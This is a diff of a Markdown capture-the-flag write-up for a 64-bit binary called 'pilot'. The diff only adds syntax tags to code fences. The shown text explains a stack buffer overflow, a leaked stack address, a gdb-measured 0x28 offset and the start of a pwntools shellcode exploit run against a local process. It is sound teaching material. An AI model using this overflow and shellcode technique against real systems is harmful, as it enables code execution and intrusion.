@@ -2,7 +2,7 @@
 
 Let's take a look at the binary:
 
-```
+```console
 $	file pilot 
 pilot: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/l, for GNU/Linux 2.6.32, BuildID[sha1]=6ed26a43b94fd3ff1dd15964e4106df72c01dc6c, stripped
 $	./pilot 
@@ -18,7 +18,7 @@ $	./pilot
 
 So we can see that we are dealing with a 64 bit binary. When we run it, we see that it prints out a lot of text, including what looks like a memory address from the stack memory region. It then prompts us for input. Looking through the functions in Ghidra, we don't see a function labeled main. However we can find function `FUN_004009a6` which contains a lot of strings that we saw the program and output, and it looks like what we would expect to see:
 
-```
+```c
 
 undefined8 FUN_004009a6(void)
 
@@ -74,13 +74,13 @@ undefined8 FUN_004009a6(void)
 
 Looking through this code, we see that it prints a lot of text. However there are two important sections. The first is where it scans in the data:
 
-```
+```c
   sVar1 = read(0,input,0x40);
 ```
 
 We can see that it scans in `0x40` bytes worth of input into `input`. The char array `input` can only hold `32` bytes worth of input, so we have an overflow. Also we can see that the address printed is an infoleak (information about the program that is leak) for the start of our input in memory on the stack:
 
-```
+```c
   this = operator<<<std--char_traits<char>>((basic_ostream *)cout,"[*]Location:");
   this_00 = (basic_ostream<char,std--char_traits<char>> *)
             operator<<((basic_ostream<char,std--char_traits<char>> *)this,input);
@@ -89,7 +89,7 @@ We can see that it scans in `0x40` bytes worth of input into `input`. The char a
 
 Looking at the stack layout in Ghidra, there doesn't really look like there is anything between the start of our input and the return address. With our overflow we should be able to overwrite the return address and get code execution:
 
-```
+```nasm
                              **************************************************************
                              *                          FUNCTION                          *
                              **************************************************************
@@ -105,7 +105,7 @@ Looking at the stack layout in Ghidra, there doesn't really look like there is a
 
 Let's find the offset between the start of our input and the return address using gdb. We will set a breakpoint for right after the read call, and look at the memory there:
 
-```
+```gdb
 gef➤  b *0x400ae5
 Breakpoint 1 at 0x400ae5
 gef➤  r
@@ -183,7 +183,7 @@ Stack level 0, frame at 0x7fffffffdeb0:
 
 So we can see that the offset between the start of our input and the return address is `0x7fffffffdea8 - 0x7fffffffde80 = 0x28` bytes. So we have a way to overwrite the return address, a place to store our shellcode, and we know where it is in memory. With this we can write our exploit:
 
-```
+```python
 from pwn import *
 
 target = process('./pilot')
@@ -214,7 +214,7 @@ target.interactive()
 
 When we run it:
 
-```
+```console
 $	python exploit.py 
 [+] Starting local process './pilot': pid 5764
 [*]Welcome DropShip Pilot...
